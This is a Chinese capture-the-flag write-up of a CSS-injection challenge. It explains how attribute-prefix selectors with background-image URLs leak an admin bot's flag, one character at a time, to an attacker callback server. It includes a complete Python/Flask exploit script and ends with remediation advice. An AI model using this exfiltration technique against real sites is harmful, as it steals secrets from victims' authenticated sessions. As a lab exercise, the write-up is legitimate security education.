# 跨站脚本攻击加CSS还是XSS？？？

## 题目简述

题目提供注册、登录、粘贴 note、查看 note 和提交 URL 给管理员 Bot 访问等功能。note 内容会经过 DOMPurify，脚本和危险事件属性无法保留，但默认允许的 `<style>` 标签仍可进入页面。管理员查看 note 时，flag 被放在 `<meta name="secret">` 的 `content` 属性中。

因此不需要绕过净化器执行 JavaScript，而是利用 CSS 属性选择器做盲注：枚举 secret 的下一个字符，为每个候选前缀设置不同的背景图片 URL；只有匹配真实前缀的规则会触发浏览器向攻击服务器请求。收到回连后重复生成下一条 note，即可逐字符恢复 flag。

## 解题过程

### 定位可泄露的 DOM 属性

查看 note 时，服务端根据当前会话决定 `secret`：

```javascript
res.render('view', {
    content: notes.get(id) || 'Note not found',
    secret: (req.session.user === 'admin') ? FLAG : 'Admin Channel',
    note: (req.session.user === 'admin')
        ? 'Welcome Admin'
        : 'You Are Not Admin So No Secrets Here'
});
```

`view.ejs` 把该值写入 `head` 中的属性：

```html
<meta readonly name="secret" content="<%- locals.secret %>">
```

普通用户只能看到 `Admin Channel`，但 Bot 会先使用 `passwd.txt` 中的随机密码登录 `admin`，再访问报告的 URL，所以 Bot 会话中的同一元素包含真实 flag。

### 构造 CSS 前缀探测

CSS 选择器 `[content^="prefix"]` 可以判断属性是否以给定字符串开头。例如已知前缀为 `0xG`，测试下一个字符 `a`：

```css
head,
meta[name="secret"] {
    display: block;
    width: 1px;
    height: 1px;
}

meta[name="secret"][content^="0xGa"] {
    background-image: url("http://host.docker.internal:8000/leak?c=a&n=3");
}
```

`meta` 默认不参与可视布局，显式设置 `display` 和尺寸可确保匹配规则请求背景资源。每轮为允许字符表中的所有候选生成一条规则，只有正确候选会回连。参数 `n` 记录当前位置，使每轮 URL 唯一，也便于忽略浏览器重复请求或过期回连。

note 保存逻辑虽然调用 DOMPurify，但随后用 `<%- locals.content %>` 原样输出已净化内容。`<style>` 及上述安全语法能保留下来，因而形成 CSS 注入而非 JavaScript XSS。

### 自动逐字符泄露

下面的单文件脚本同时负责注册普通用户、创建探测 note、接收 CSS 回连以及向 Bot 提供控制页。`TARGET` 是攻击者访问题目服务的地址，`ATTACK_ORIGIN` 必须改成题目容器中的 Bot 能访问到的回连地址：

```python
import re
import secrets
import string
from urllib.parse import quote

import requests
from flask import Flask, request

TARGET = "http://127.0.0.1:10800"
ATTACK_ORIGIN = "http://host.docker.internal:8000"
INTERNAL_TARGET = "http://localhost:3000"

alphabet = string.ascii_letters + string.digits + "{}-_"
recovered = ""
next_note_id = ""

app = Flask(__name__)
session = requests.Session()

credentials = {
    "username": secrets.token_hex(6),
    "password": secrets.token_hex(6),
}
session.post(f"{TARGET}/register", data=credentials)
session.post(f"{TARGET}/login", data=credentials)


def create_probe(prefix):
    global next_note_id

    if prefix.endswith("}"):
        next_note_id = "done"
        print(f"flag: {prefix}")
        return

    position = len(prefix)
    rules = [
        "head, meta[name='secret'] {",
        "  display: block;",
        "  width: 1px;",
        "  height: 1px;",
        "}",
    ]

    for candidate_char in alphabet:
        candidate = prefix + candidate_char
        encoded = quote(candidate_char, safe="")
        rules.append(
            "meta[name='secret'][content^='{}'] {{"
            "background-image:url('{}/leak?c={}&n={}');"
            "}}".format(candidate, ATTACK_ORIGIN, encoded, position)
        )

    content = "<style>" + "\n".join(rules) + "</style>"
    response = session.post(f"{TARGET}/paste", data={"content": content})
    next_note_id = re.search(r'href="/view/([^"]+)"', response.text).group(1)
    print(f"next note id: {next_note_id}")


CONTROL_PAGE = """
<script>
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

(async () => {
  while (true) {
    const response = await fetch('/next', {cache: 'no-store'});
    const noteId = await response.text();
    if (noteId === 'done') break;

    if (noteId) {
      const popup = window.open(
        'http://localhost:3000/view/' + noteId + '?t=' + Date.now()
      );
      await sleep(1200);
      if (popup) popup.close();
    }
    await sleep(200);
  }
})();
</script>
"""


@app.get("/exp.html")
def exp_html():
    return CONTROL_PAGE


@app.get("/next")
def next_note():
    return next_note_id


@app.get("/leak")
def leak():
    global recovered

    position = int(request.args["n"])
    candidate_char = request.args["c"]
    if position != len(recovered):
        return "stale"

    recovered += candidate_char
    print(f"flag: {recovered}")
    create_probe(recovered)
    return "ok"


@app.get("/start")
def start_bot():
    session.post(
        f"{TARGET}/report",
        data={"url": f"{ATTACK_ORIGIN}/exp.html"},
    )
    return "bot scheduled"


if __name__ == "__main__":
    create_probe("")
    app.run(host="0.0.0.0", port=8000)
```

先运行脚本，确认 8000 端口能被 Bot 访问，再从另一终端请求 `http://127.0.0.1:8000/start`。控制页会在管理员会话中依次打开新生成的 note；回连日志最终恢复：

```text
0xGame{CSS_Can_Also_Inject}
```

## 方法总结

本题是 CSS 属性外带，不是传统脚本型 XSS。DOMPurify 成功阻止了脚本执行，却没有消除攻击者控制样式表的能力；敏感值又被写进可由 CSS 选择器匹配的 DOM 属性，二者组合形成逐字符侧信道。修复时应禁止不可信 `<style>` 和外部资源规则，并避免把 secret 放入攻击者可影响样式的页面 DOM 中。
